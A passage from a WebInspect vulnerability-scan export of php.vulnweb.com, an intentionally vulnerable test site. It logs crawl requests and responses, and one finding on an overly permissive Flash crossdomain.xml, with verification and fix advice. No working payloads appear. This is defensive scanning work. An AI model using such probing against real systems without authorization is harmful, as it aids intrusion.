User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="FAF765E4B6181822E8C9C961F9569838";PSID="880C0BFE1BAF08A6AABCD8E9B428CD2B";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";Format="Qualified";LinkKind="FormAction";Locations="HtmlNode";Source="StaticParser";tid="74";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="2ea7c128";
X-Request-Memo: ID="c5f48606";sc="1";tid="35";
Cookie: CustomCookie=WebInspect0

uuname=12345&upass=foo&upass2=foo&urname=12345&ucc=12345&uemail=John.Doe%40somewhere.com&uphone=770&uaddress=1707%20Interdimensional%20Street&signup=signup]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:59 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 782

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
	<p>You have been introduced to our database with the above informations:</p><ul><li>Username: 12345</li><li>Password: foo</li><li>Name: 12345</li><li>Address: 1707 Interdimensional Street</li><li>E-Mail: John.Doe@somewhere.com</li><li>Phone number: 770</li><li>Credit card: 12345</li></ul><p>Now you can login from <a href='http://php.vulnweb.com/login.php'>here.</p></div>
</body>
</html>
]]></RawResponse><Request id="FAF765E4B6181822E8C9C961F9569838"><Method>POST</Method><Path>/secured/</Path><File>newuser</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>uuname=12345&amp;upass=foo&amp;upass2=foo&amp;urname=12345&amp;ucc=12345&amp;uemail=John.Doe%40somewhere.com&amp;uphone=770&amp;uaddress=1707%20Interdimensional%20Street&amp;signup=signup</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/signup.php</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>155</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="FAF765E4B6181822E8C9C961F9569838";PSID="880C0BFE1BAF08A6AABCD8E9B428CD2B";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";Format="Qualified";LinkKind="FormAction";Locations="HtmlNode";Source="StaticParser";tid="74";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="2ea7c128";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="c5f48606";sc="1";tid="35";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
	<p>You have been introduced to our database with the above informations:</p><ul><li>Username: 12345</li><li>Password: foo</li><li>Name: 12345</li><li>Address: 1707 Interdimensional Street</li><li>E-Mail: John.Doe@somewhere.com</li><li>Phone number: 770</li><li>Credit card: 12345</li></ul><p>Now you can login from <a href='http://php.vulnweb.com/login.php'>here.</p></div>
</body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:59 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>782</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="9392ADD8B324841441071EDCE23F7685"><URL>http://php.vulnweb.com:80/secured/style.css</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="9392ADD8B324841441071EDCE23F7685"><![CDATA[GET /secured/style.css HTTP/1.1
Referer: http://php.vulnweb.com/secured/newuser.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="9392ADD8B324841441071EDCE23F7685";PSID="553EDC90FC6DCEBD97AD652FC78258EB";SessionType="Crawl";CrawlType="ScriptInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="28";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="c9674fc6";
X-Request-Memo: ID="3776c6a5";sc="1";tid="28";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:45:00 GMT
ETag: "4dca64a0-156a"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: text/css
Accept-Ranges: bytes
Last-Modified: Wed, 11 May 2011 10:27:44 GMT
Content-Length: 5482

body{
	font-family: Arial,sans-serif;
	color: #333333;
	line-height: 1.166;	
	margin: 0px;
	padding: 0px;
}

a:link, a:visited{
	color: #006699;
	text-decoration: none;
}

a:hover {
	text-decoration: underline;
}

h1, h2, h3, h4, h5, h6 {
	font-family: Arial,sans-serif;
	margin: 0px;
	padding: 0px;
}

h1{
 font-family: Verdana,Arial,sans-serif;
 font-size: 120%;
 color: #334d55;
}

h2{
 font-size: 114%;
 color: #006699;
}

h3{
 font-size: 100%;
 color: #334d55;
}

h4{
 font-size: 100%;
 font-weight: normal;
 color: #333333;
}

h5{
 font-size: 100%;
 color: #334d55;
}

ul{
 list-style-type: square;
}

ul ul{
 list-style-type: disc;
}

ul ul ul{
 list-style-type: none;
}

label{
 font: bold 100% Arial,sans-serif;
 color: #334d55;
}
				

/***********************************************/
/* Layout Divs                                 */
/***********************************************/

#masthead{
	margin: 0;
	padding: 10px 0px;
	border-bottom: 1px solid #cccccc;
	width: 100%;
}

#navBar{
	margin: 0 79% 0 0;
	padding: 0px;
	background-color: #eeeeee;
	border-right: 1px solid #ccc;
	border-bottom: 1px solid #ccc;
}

#content{
  float:right;
	width: 75%;
	margin: 0;
	padding: 0 3% 0 0;
}


/***********************************************/
/*Component Divs                               */
/***********************************************/

#siteName{
	margin: 0px;
	padding: 0px 0px 10px 10px;
}


/*************** #pageName styles **************/

#pageName{
	padding: 0px 0px 10px 10px;
}


/************* #globalNav styles **************/

#globalNav{
color: #cccccc;
padding: 0px 0px 0px 10px;
white-space: nowrap;
}
/* 'nowrap' prevents links from line-wrapping if there are too many to fit in one line
   this will force a horizontal scrollbar if there isn't enough room for all links
   remove rule or change value to 'normal' if you want the links to line-wrap */

#globalNav img{
 display: block;
}

#globalNav a {
	font-size: 90%;
	padding: 0px 4px 0px 0px; 
}


/************* #breadCrumb styles *************/

#breadCrumb{
	font-size: 80%;
	padding: 5px 0px 5px 10px;
}


/************** .feature styles ***************/

.feature{
	padding: 0px 0px 10px 10px;
	font-size: 80%;
}

.feature h3{
	padding: 30px 0px 5px 0px;
	text-align: center;
}

.feature img{
	float: left;
	padding: 0px 10px 0px 0px;
	margin: 0 5px 5px 0;
}
/* adjust margins to change separation between the feature image and text flowing around it */


/************** .story styles *****************/

.story{
	clear: both;
	padding: 10px 0px 0px 10px;
	font-size: 80%;
	background-color:#FFFFFF;
}

.story p{
	padding: 0px 0px 10px 0px;
	background-color:#FFFFFF;
}

/************* #siteInfo styles ***************/

#siteInfo{
	clear: both;
	border: 1px solid #cccccc;
	font-size: 75%;
	color: #cccccc;
	padding: 10px 10px 10px 10px;
	margin-top: -1px;
}
/* negative top margin pulls siteinfo up so its top border overlaps (and thus lines up with)
	the bottom border of the navBar in cases where they "touch" */

#siteInfo img{
	padding: 4px 4px 4px 0px;
	vertical-align: middle;
}


/************* #search styles ***************/

#search{
	padding: 5px 0px 5px 10px;
	border-bottom: 1px solid #cccccc;
	font-size: 90%;
}

#search form{
 margin: 0px;
 padding: 0px;
}

#search label{
	display: block;
	margin: 0px;
	padding: 0px;
}


/*********** #navBar link styles ***********/

#navBar ul a:link, #navBar ul a:visited {display: block;}
#navBar ul {list-style: none; margin: 0; padding: 0;}

/* hack to fix IE/Win's broken rendering of block-level anchors in lists */
#navBar li {border-bottom: 1px solid #EEE;}

/* fix for browsers that don't need the hack */
html>body #navBar li {border-bottom: none;}


/*********** #sectionLinks styles ***********/

#sectionLinks{
	position: relative;
	margin: 0px;
	padding: 0px;
	border-bottom: 1px solid #cccccc;
	font-size: 90%;
}

#sectionLinks h3{
	padding: 10px 0px 2px 10px;
}

#sectionLinks a:link{
	padding: 2px 0px 2px 10px;
	border-top: 1px solid #cccccc;
	width: 100%;
  voice-family: "\"}\""; 
  voice-family:inherit;
	width: auto;
}

#sectionLinks a:visited{
	border-top: 1px solid #cccccc;
	padding: 2px 0px 2px 10px;
}

#sectionLinks a:hover{
	border-top: 1px solid #cccccc;
	background-color: #dddddd;
	padding: 2px 0px 2px 10px;
}


/*********** .relatedLinks styles ***********/

.relatedLinks{
	margin: 0px;
	padding: 0px 0px 10px 10px;
	font-size: 90%;
}

.relatedLinks h3{
	padding: 10px 0px 2px 0px;
}


/************** #advert styles **************/

#advert{
	padding: 10px 0px 0px 10px;
	font-size: 80%;
	border-top: 1px solid #cccccc;
}

#advert img{
	display: block;
}


/************** #headlines styles **************/

#headlines{
	margin: 0px;
	padding: 10px 0px 20px 10px;
	font-size: 80%;
}

#headlines p{
	padding: 5px 0px 5px 0px;
}

img {
	border: none;
	padding: 0px 10px 0px 0px;
}

input {
	font-family:Verdana,Sans-serif; 
	font-size:10px;
	border-style:ridge;
	background-color:#F5F5F5;
}

textarea {
	font-family:Verdana,Sans-serif; 
	font-size:10px;
	border-style:ridge;
	background-color:#F5F5F5;
}

table {
	background-color:#EEEEEE;
}
td {
	background-color:#FFFFFF;
}]]></RawResponse><Request id="9392ADD8B324841441071EDCE23F7685"><Method>GET</Method><Path>/secured/</Path><File>style</File><Ext>css</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/secured/newuser.php</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="9392ADD8B324841441071EDCE23F7685";PSID="553EDC90FC6DCEBD97AD652FC78258EB";SessionType="Crawl";CrawlType="ScriptInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="28";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="c9674fc6";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="3776c6a5";sc="1";tid="28";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[body{
	font-family: Arial,sans-serif;
	color: #333333;
	line-height: 1.166;	
	margin: 0px;
	padding: 0px;
}

a:link, a:visited{
	color: #006699;
	text-decoration: none;
}

a:hover {
	text-decoration: underline;
}

h1, h2, h3, h4, h5, h6 {
	font-family: Arial,sans-serif;
	margin: 0px;
	padding: 0px;
}

h1{
 font-family: Verdana,Arial,sans-serif;
 font-size: 120%;
 color: #334d55;
}

h2{
 font-size: 114%;
 color: #006699;
}

h3{
 font-size: 100%;
 color: #334d55;
}

h4{
 font-size: 100%;
 font-weight: normal;
 color: #333333;
}

h5{
 font-size: 100%;
 color: #334d55;
}

ul{
 list-style-type: square;
}

ul ul{
 list-style-type: disc;
}

ul ul ul{
 list-style-type: none;
}

label{
 font: bold 100% Arial,sans-serif;
 color: #334d55;
}
				

/***********************************************/
/* Layout Divs                                 */
/***********************************************/

#masthead{
	margin: 0;
	padding: 10px 0px;
	border-bottom: 1px solid #cccccc;
	width: 100%;
}

#navBar{
	margin: 0 79% 0 0;
	padding: 0px;
	background-color: #eeeeee;
	border-right: 1px solid #ccc;
	border-bottom: 1px solid #ccc;
}

#content{
  float:right;
	width: 75%;
	margin: 0;
	padding: 0 3% 0 0;
}


/***********************************************/
/*Component Divs                               */
/***********************************************/

#siteName{
	margin: 0px;
	padding: 0px 0px 10px 10px;
}


/*************** #pageName styles **************/

#pageName{
	padding: 0px 0px 10px 10px;
}


/************* #globalNav styles **************/

#globalNav{
color: #cccccc;
padding: 0px 0px 0px 10px;
white-space: nowrap;
}
/* 'nowrap' prevents links from line-wrapping if there are too many to fit in one line
   this will force a horizontal scrollbar if there isn't enough room for all links
   remove rule or change value to 'normal' if you want the links to line-wrap */

#globalNav img{
 display: block;
}

#globalNav a {
	font-size: 90%;
	padding: 0px 4px 0px 0px; 
}


/************* #breadCrumb styles *************/

#breadCrumb{
	font-size: 80%;
	padding: 5px 0px 5px 10px;
}


/************** .feature styles ***************/

.feature{
	padding: 0px 0px 10px 10px;
	font-size: 80%;
}

.feature h3{
	padding: 30px 0px 5px 0px;
	text-align: center;
}

.feature img{
	float: left;
	padding: 0px 10px 0px 0px;
	margin: 0 5px 5px 0;
}
/* adjust margins to change separation between the feature image and text flowing around it */


/************** .story styles *****************/

.story{
	clear: both;
	padding: 10px 0px 0px 10px;
	font-size: 80%;
	background-color:#FFFFFF;
}

.story p{
	padding: 0px 0px 10px 0px;
	background-color:#FFFFFF;
}

/************* #siteInfo styles ***************/

#siteInfo{
	clear: both;
	border: 1px solid #cccccc;
	font-size: 75%;
	color: #cccccc;
	padding: 10px 10px 10px 10px;
	margin-top: -1px;
}
/* negative top margin pulls siteinfo up so its top border overlaps (and thus lines up with)
	the bottom border of the navBar in cases where they "touch" */

#siteInfo img{
	padding: 4px 4px 4px 0px;
	vertical-align: middle;
}


/************* #search styles ***************/

#search{
	padding: 5px 0px 5px 10px;
	border-bottom: 1px solid #cccccc;
	font-size: 90%;
}

#search form{
 margin: 0px;
 padding: 0px;
}

#search label{
	display: block;
	margin: 0px;
	padding: 0px;
}


/*********** #navBar link styles ***********/

#navBar ul a:link, #navBar ul a:visited {display: block;}
#navBar ul {list-style: none; margin: 0; padding: 0;}

/* hack to fix IE/Win's broken rendering of block-level anchors in lists */
#navBar li {border-bottom: 1px solid #EEE;}

/* fix for browsers that don't need the hack */
html>body #navBar li {border-bottom: none;}


/*********** #sectionLinks styles ***********/

#sectionLinks{
	position: relative;
	margin: 0px;
	padding: 0px;
	border-bottom: 1px solid #cccccc;
	font-size: 90%;
}

#sectionLinks h3{
	padding: 10px 0px 2px 10px;
}

#sectionLinks a:link{
	padding: 2px 0px 2px 10px;
	border-top: 1px solid #cccccc;
	width: 100%;
  voice-family: "\"}\""; 
  voice-family:inherit;
	width: auto;
}

#sectionLinks a:visited{
	border-top: 1px solid #cccccc;
	padding: 2px 0px 2px 10px;
}

#sectionLinks a:hover{
	border-top: 1px solid #cccccc;
	background-color: #dddddd;
	padding: 2px 0px 2px 10px;
}


/*********** .relatedLinks styles ***********/

.relatedLinks{
	margin: 0px;
	padding: 0px 0px 10px 10px;
	font-size: 90%;
}

.relatedLinks h3{
	padding: 10px 0px 2px 0px;
}


/************** #advert styles **************/

#advert{
	padding: 10px 0px 0px 10px;
	font-size: 80%;
	border-top: 1px solid #cccccc;
}

#advert img{
	display: block;
}


/************** #headlines styles **************/

#headlines{
	margin: 0px;
	padding: 10px 0px 20px 10px;
	font-size: 80%;
}

#headlines p{
	padding: 5px 0px 5px 0px;
}

img {
	border: none;
	padding: 0px 10px 0px 0px;
}

input {
	font-family:Verdana,Sans-serif; 
	font-size:10px;
	border-style:ridge;
	background-color:#F5F5F5;
}

textarea {
	font-family:Verdana,Sans-serif; 
	font-size:10px;
	border-style:ridge;
	background-color:#F5F5F5;
}

table {
	background-color:#EEEEEE;
}
td {
	background-color:#FFFFFF;
}]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:45:00 GMT</Value></Header><Header><Name>ETag</Name><Value>"4dca64a0-156a"</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/css</Value></Header><Header><Name>Accept-Ranges</Name><Value>bytes</Value></Header><Header><Name>Last-Modified</Name><Value>Wed, 11 May 2011 10:27:44 GMT</Value></Header><Header><Name>Content-Length</Name><Value>5482</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="B7382798B78C9C8A68461CE2F7DF5775"><URL>http://php.vulnweb.com:80/crossdomain.xml</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="6f0150f8-195d-454a-a6fb-89cd1eacb5b3"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>10028</EngineType><AttackHTTPRequest><![CDATA[GET /crossdomain.xml HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="B7382798B78C9C8A68461CE2F7DF5775";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Probe";OriginatingEngineID="65cee7d3-561f-40dc-b5eb-c0b8c2383fcb";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10934";Engine="Request+Modify";SmartMode="4";tid="17";tt="11";
X-RequestManager-Memo: sid="37";smi="0";sc="1";ID="51f76257";
X-Request-Memo: ID="66ee6f62";sc="1";tid="44";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>10241</VulnerabilityID><Severity>2</Severity><Name>Flash Unrestricted Cross-Domain Access</Name><Classifications><Classification kind="7PK" identifier="Encapsulation" href="https://vulncat.fortify.com/">Encapsulation</Classification><Classification kind="7PK Category" identifier="Flash Misconfiguration: Overly Permissive Cross-Do" href="https://vulncat.fortify.com/">Flash Misconfiguration: Overly Permissive Cross-Domain Policy</Classification><Classification kind="CWE" identifier="CWE-942" href="https://cwe.mitre.org/data/definitions/942.html">CWE-942: Overly Permissive Cross-domain Whitelist</Classification></Classifications><DetectionSelection><Location offset="5" length="15" /><Location offset="9" length="3" /><Location offset="469" length="29" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[The Flash cross-domain policy defined in the crossdomain.xml file allows arbitrary third-party Flash access to the web site, which could be used to recover user cookies and automate CSRF/XSRF attacks.  Recommendations include using a separate DNS domain to host the Flash API.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />
Verifying the vulnerability involves making a request for "/crossdomain.xml" and looking for the <allow-access-from> tag that has a 'domain' value set to '*'.  Exploiting the vulnerability involves crafting a custom Flash application.</allow-access-from>]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Security Operations:</b><br />
The crossdomain.xml file should be modified to not allow arbitrary third parties to access the site.  This involves replacing the <allow-access-from domain="*"> line with a more absolute domain value.  If arbitrary third-party access is required, the Flash API should be moved to an isolated sub-domain that does not host any standard web content.

<br /><b>For Development:</b><br />
Do not design and deploy Flash APIs meant to be accessible to arbitrary third parties, if possible.  Otherwise, always deploy the Flash API and material on an isolated sub domain, to ensure third-party Flash applications will not be able to access client-side materials hosted in the normal domain.

<br /><b>For QA:</b><br />
This problem will be resolved by the web application server administrator or developers.


</allow-access-from>]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Adobe recommendations for creating a secure cross domain policy file</b><br /><a href="http://www.adobe.com/devnet/flash/articles/fplayer_security_03.html">http://www.adobe.com/devnet/flash/articles/fplayer_security_03.html</a><br /><b>Chris Shiflett: The Dangers of Cross Domain Ajax with Flash</b><br /><a href="http://shiflett.org/blog/2006/sep/the-dangers-of-cross-domain-ajax-with-flash">http://shiflett.org/blog/2006/sep/the-dangers-of-cross-domain-ajax-with-flash</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="B7382798B78C9C8A68461CE2F7DF5775"><![CDATA[GET /crossdomain.xml HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="B7382798B78C9C8A68461CE2F7DF5775";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Probe";OriginatingEngineID="65cee7d3-561f-40dc-b5eb-c0b8c2383fcb";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10934";Engine="Request+Modify";SmartMode="4";tid="17";tt="11";
X-RequestManager-Memo: sid="37";smi="0";sc="1";ID="51f76257";
X-Request-Memo: ID="66ee6f62";sc="1";tid="44";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:45:31 GMT
ETag: "504f12be-e0"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: text/xml
Accept-Ranges: bytes
Last-Modified: Tue, 11 Sep 2012 10:30:22 GMT
Content-Length: 224

<?xml version="1.0"?>
<!DOCTYPE cross-domain-policy SYSTEM "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
<cross-domain-policy>
<allow-access-from domain="*" to-ports="*" secure="false"/>
</cross-domain-policy>]]></RawResponse><Request id="B7382798B78C9C8A68461CE2F7DF5775"><Method>GET</Method><Path>/</Path><File>crossdomain</File><Ext>xml</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="B7382798B78C9C8A68461CE2F7DF5775";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Probe";OriginatingEngineID="65cee7d3-561f-40dc-b5eb-c0b8c2383fcb";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10934";Engine="Request+Modify";SmartMode="4";tid="17";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="37";smi="0";sc="1";ID="51f76257";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="66ee6f62";sc="1";tid="44";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<?xml version="1.0"?>
<!DOCTYPE cross-domain-policy SYSTEM "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
<cross-domain-policy>
<allow-access-from domain="*" to-ports="*" secure="false"/>
</cross-domain-policy>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:45:31 GMT</Value></Header><Header><Name>ETag</Name><Value>"504f12be-e0"</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml</Value></Header><Header><Name>Accept-Ranges</Name><Value>bytes</Value></Header><Header><Name>Last-Modified</Name><Value>Tue, 11 Sep 2012 10:30:22 GMT</Value></Header><Header><Name>Content-Length</Name><Value>224</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="5564A005D4DBE8A338ECD84842C68F1B"><URL>http://php.vulnweb.com:80/crossdomain.xml</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="e5e7e253-384a-4bc0-92d1-ad923d27b6dd"><CheckTypeID>Best Practices</CheckTypeID><EngineType>3855</EngineType><AttackHTTPRequest><![CDATA[GET /crossdomain.xml HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="5564A005D4DBE8A338ECD84842C68F1B";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="63a283c6-6b75-41e3-b0c2-d7b0821c2902";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10242";Engine="Fixed";SmartMode="4";tid="17";tt="11";
X-RequestManager-Memo: sid="39";smi="0";sc="1";ID="44d5acdb";
X-Request-Memo: ID="ac807dc2";sc="1";tid="45";
Cookie: CustomCookie=WebInspect0

